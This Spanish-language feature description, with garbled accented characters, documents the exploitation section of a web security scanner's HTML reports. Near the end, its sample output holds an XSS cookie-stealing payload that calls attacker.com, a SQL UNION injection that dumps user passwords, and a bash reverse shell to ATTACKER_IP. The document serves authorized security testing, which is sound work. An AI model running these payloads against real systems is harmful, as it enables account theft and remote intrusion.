# SecciÃ³n de ExplotaciÃ³n en Reportes HTML

## DescripciÃ³n

Se ha aÃ±adido una secciÃ³n detallada de explotaciÃ³n a cada vulnerabilidad en los reportes HTML generados por WebSec Framework. Esta secciÃ³n proporciona informaciÃ³n prÃ¡ctica y real sobre cÃ³mo explotar cada vulnerabilidad detectada.

## CaracterÃ­sticas Implementadas

### 1. InformaciÃ³n de ExplotaciÃ³n por Tipo de Vulnerabilidad

Cada vulnerabilidad ahora incluye:

- **DescripciÃ³n de ExplotaciÃ³n**: ExplicaciÃ³n clara de cÃ³mo funciona la explotaciÃ³n
- **Pasos de ExplotaciÃ³n**: Lista ordenada de pasos para explotar la vulnerabilidad
- **ğŸ¯ POC EspecÃ­fico**: CÃ³digo real basado en el payload detectado durante el escaneo
- **ğŸ”— POCs Reales en GitHub**: Enlaces directos a repositorios con POCs verificados
- **ğŸ’¡ Ejemplos GenÃ©ricos**: POCs de ejemplo para entender el ataque
- **ğŸ› ï¸ Herramientas Recomendadas**: Lista de herramientas con enlaces a sus repositorios
- **ğŸ’¥ Impacto Potencial**: DescripciÃ³n detallada del daÃ±o que puede causar

### 2. POCs Personalizados vs Enlaces a GitHub

El sistema ahora proporciona un enfoque hÃ­brido:

#### POC EspecÃ­fico (Detectado)
- Generado automÃ¡ticamente basado en la vulnerabilidad real encontrada
- Incluye la URL exacta, parÃ¡metro y payload detectado
- Listo para copiar y pegar
- Ejemplo: `http://target.com/search?q=<script>alert(1)</script>`

#### Enlaces a POCs Reales en GitHub
- Repositorios verificados y mantenidos por la comunidad
- PayloadsAllTheThings - Colecciones completas de payloads
- Repositorios especializados por tipo de vulnerabilidad
- Cheat sheets y guÃ­as de OWASP

#### Ejemplos GenÃ©ricos
- POCs de ejemplo para entender diferentes tÃ©cnicas
- Variaciones del ataque
- TÃ©cnicas de bypass

### 2. Tipos de Vulnerabilidades Soportadas

Cada tipo incluye POCs especÃ­ficos, enlaces a GitHub y herramientas:

#### XSS (Cross-Site Scripting)
- POCs para robo de cookies, keyloggers, bypass de filtros
- **GitHub**: PayloadsAllTheThings XSS, XSS Payloads List, Awesome XSS
- **Herramientas**: XSStrike, BeEF, dalfox

#### SQL Injection
- DetecciÃ³n, UNION-based, blind injection, comandos SQLMap
- **GitHub**: PayloadsAllTheThings SQLi, SQL Injection Payload List, SQLMap Tampers
- **Herramientas**: SQLMap, jSQL Injection, Ghauri

#### CSRF (Cross-Site Request Forgery)
- Formularios auto-submit, AJAX, ataques con imÃ¡genes
- **GitHub**: PayloadsAllTheThings CSRF, CSRF PoC Generator
- **Herramientas**: Burp Suite, CSRFTester

#### LFI (Local File Inclusion)
- Path traversal, PHP wrappers, log poisoning
- **GitHub**: PayloadsAllTheThings LFI, LFI Cheat Sheet
- **Herramientas**: LFISuite, Kadimus

#### SSRF (Server-Side Request Forgery)
- Localhost, AWS metadata, port scanning, bypass
- **GitHub**: PayloadsAllTheThings SSRF, Awesome SSRF
- **Herramientas**: SSRFmap, Gopherus

#### Command Injection
- Reverse shells (Bash/Python/PHP), exfiltraciÃ³n
- **GitHub**: PayloadsAllTheThings Command Injection, Reverse Shell Cheat Sheet
- **Herramientas**: Commix, Netcat

#### XXE (XML External Entity)
- Lectura de archivos, SSRF, blind XXE
- **GitHub**: PayloadsAllTheThings XXE, XXE Lab
- **Herramientas**: XXEinjector, Burp Suite

#### CORS Misconfiguration
- Robo de datos con Fetch/XHR
- **GitHub**: PayloadsAllTheThings CORS, CORS Exploitation
- **Herramientas**: CORScanner, Burp Suite

#### Authentication Bypass
- SQLi en login, JWT manipulation, session fixation
- **GitHub**: PayloadsAllTheThings Authentication, JWT Attack Playbook
- **Herramientas**: Hydra, JWT_Tool

#### Security Headers Missing
- Clickjacking, verificaciÃ³n de headers
- **GitHub**: OWASP HTTP Headers Cheat Sheet, Clickjacking POCs
- **Herramientas**: SecurityHeaders.com, Mozilla Observatory

## DiseÃ±o Visual

### Estilos CSS Implementados

La secciÃ³n de explotaciÃ³n tiene un diseÃ±o distintivo:

- **Fondo amarillo claro** (#fff3cd) para destacar la informaciÃ³n crÃ­tica
- **Borde naranja** (#ff9800) para llamar la atenciÃ³n
- **CÃ³digo con fondo oscuro** (#2d2d2d) para los POCs
- **TipografÃ­a monoespaciada** para cÃ³digo
- **Formato responsive** que se adapta a diferentes tamaÃ±os de pantalla

### Estructura Visual

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ âš ï¸ CÃ³mo Explotar Esta Vulnerabilidad   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ DescripciÃ³n de la explotaciÃ³n          â”‚
â”‚                                         â”‚
â”‚ Pasos de ExplotaciÃ³n:                  â”‚
â”‚ 1. Paso uno                            â”‚
â”‚ 2. Paso dos                            â”‚
â”‚ ...                                    â”‚
â”‚                                         â”‚
â”‚ ğŸ’£ Proof of Concept (POC):             â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ # CÃ³digo POC                      â”‚ â”‚
â”‚ â”‚ comando o cÃ³digo de explotaciÃ³n   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                         â”‚
â”‚ ğŸ› ï¸ Herramientas Recomendadas:          â”‚
â”‚ â€¢ Herramienta 1                        â”‚
â”‚ â€¢ Herramienta 2                        â”‚
â”‚                                         â”‚
â”‚ ğŸ’¥ Impacto Potencial:                  â”‚
â”‚ DescripciÃ³n del daÃ±o posible           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## Archivos Modificados

### 1. `core/html_reporter.py`

**FunciÃ³n aÃ±adida**: `_generate_exploitation_info(finding)`
- Genera informaciÃ³n de explotaciÃ³n especÃ­fica para cada tipo de vulnerabilidad
- Utiliza evidencia del finding para personalizar los POCs
- Integra recursos de GitHub desde mÃ³dulo externo
- Retorna un diccionario con toda la informaciÃ³n de explotaciÃ³n

**FunciÃ³n modificada**: `_prepare_report_data(data)`
- Ahora enriquece cada finding con informaciÃ³n de explotaciÃ³n
- Llama a `_generate_exploitation_info()` para cada vulnerabilidad

### 2. `core/exploitation_resources.py` (NUEVO)

**MÃ³dulo de recursos de explotaciÃ³n**:
- Centraliza todos los enlaces a POCs de GitHub
- Define herramientas recomendadas con sus repositorios
- FunciÃ³n `get_resources_for_vuln_type()` para obtener recursos por tipo
- FÃ¡cil de mantener y actualizar
- Mapeo automÃ¡tico de tipos de vulnerabilidad a recursos

### 3. `templates/professional_report.html`

**SecciÃ³n aÃ±adida**: Bloque de explotaciÃ³n mejorado en detalles de vulnerabilidad
- POC especÃ­fico detectado (destacado con borde verde)
- Enlaces a POCs reales en GitHub (con iconos y descripciones)
- Ejemplos genÃ©ricos de POCs
- Herramientas con enlaces clickeables
- Se muestra entre la descripciÃ³n y la recomendaciÃ³n
- Incluye condicionales Jinja2 para mostrar cada subsecciÃ³n
- Formato responsive y accesible

**Estilos CSS aÃ±adidos**:
- `.exploitation-section`: Contenedor principal
- `.poc-specific`: POC detectado con borde verde
- `.github-pocs`: Contenedor de enlaces a GitHub
- `.github-poc-item`: Cada enlace individual
- `.tools-list`: Lista de herramientas
- `.tool-item`: Cada herramienta con enlace

## Uso

### GeneraciÃ³n AutomÃ¡tica

La secciÃ³n de explotaciÃ³n se genera automÃ¡ticamente al crear cualquier reporte HTML:

```python
from core.html_reporter import HTMLReporter

reporter = HTMLReporter()
reporter.generate(consolidated_data, 'report.html')
```

### PersonalizaciÃ³n

Los POCs se personalizan automÃ¡ticamente con:
- URL del objetivo
- ParÃ¡metro vulnerable
- Payload detectado
- Contexto especÃ­fico de la vulnerabilidad

## Testing

### Script de Prueba

Se incluye `tests/test_exploitation_section.py` que:
- Genera un reporte con 9 tipos diferentes de vulnerabilidades
- Verifica que la secciÃ³n de explotaciÃ³n estÃ© presente
- Confirma que los POCs se incluyen correctamente
- Valida los estilos CSS

### Ejecutar Test

```bash
python tests/test_exploitation_section.py
```

## Beneficios

1. **Educativo**: Ayuda a entender cÃ³mo funcionan las vulnerabilidades
2. **PrÃ¡ctico**: Proporciona POCs reales y funcionales
3. **Completo**: Incluye herramientas y pasos detallados
4. **Profesional**: Mejora la calidad de los reportes
5. **Accionable**: Permite validar y demostrar el impacto real

## Consideraciones de Seguridad

âš ï¸ **IMPORTANTE**: Esta informaciÃ³n debe usarse Ãºnicamente con fines:
- Educativos
- De testing autorizado
- De auditorÃ­a de seguridad legÃ­tima
- Con permiso explÃ­cito del propietario del sistema

El uso no autorizado de esta informaciÃ³n puede ser ilegal y estÃ¡ estrictamente prohibido.

### Seguridad del Reporte HTML

Los POCs contienen cÃ³digo HTML y JavaScript que podrÃ­a ejecutarse si no se maneja correctamente. Para prevenir esto:

1. **Escape automÃ¡tico**: Todos los POCs se escapan usando el filtro `|e` de Jinja2
2. **Etiqueta `<pre>`**: El cÃ³digo se muestra dentro de `<pre>` para preservar formato
3. **Sin ejecuciÃ³n**: Los tags como `<script>`, `<form>`, `<iframe>` se convierten a entidades HTML (`&lt;script&gt;`)
4. **VerificaciÃ³n**: El script `tests/verify_no_redirect.py` valida que no haya cÃ³digo ejecutable

**Resultado**: Los POCs se muestran como texto plano, no como cÃ³digo ejecutable.

## Ejemplos de Salida

### XSS
```javascript
// POC - Robo de Cookies
http://target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

### SQL Injection
```sql
-- POC - UNION Based
http://target.com/product?id=1' UNION SELECT 1,username,password FROM users--
```

### Command Injection
```bash
# POC - Reverse Shell
http://target.com/ping?host=; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## Futuras Mejoras

- [ ] AÃ±adir mÃ¡s tipos de vulnerabilidades
- [ ] Incluir videos o GIFs demostrativos
- [ ] Generar POCs mÃ¡s contextualizados segÃºn el framework detectado
- [ ] AÃ±adir nivel de dificultad de explotaciÃ³n
- [ ] Incluir mitigaciones especÃ­ficas por tecnologÃ­a
- [ ] Integrar con bases de datos de exploits (ExploitDB, etc.)

## Referencias

- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackTricks
- PayloadsAllTheThings
- MITRE ATT&CK Framework

---

**VersiÃ³n**: 1.0  
**Fecha**: 2026-02-17  
**Autor**: WebSec Framework Team
